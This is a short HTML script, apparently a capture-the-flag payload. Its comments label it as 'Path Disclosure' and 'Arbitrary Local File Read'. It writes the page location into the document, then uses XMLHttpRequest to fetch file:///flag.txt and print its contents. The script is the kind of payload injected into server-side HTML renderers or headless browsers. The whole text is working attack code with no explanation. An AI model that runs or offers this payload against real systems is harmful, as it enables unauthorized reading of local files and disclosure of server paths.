<script>
 // Path Disclosure
 document.write(window.location);
 // Arbitrary Local File Read
 xhr = new XMLHttpRequest;
 xhr.onload=function(){document.write((this.responseText))};
 xhr.open("GET","file:///flag.txt");
 xhr.send();
</script>
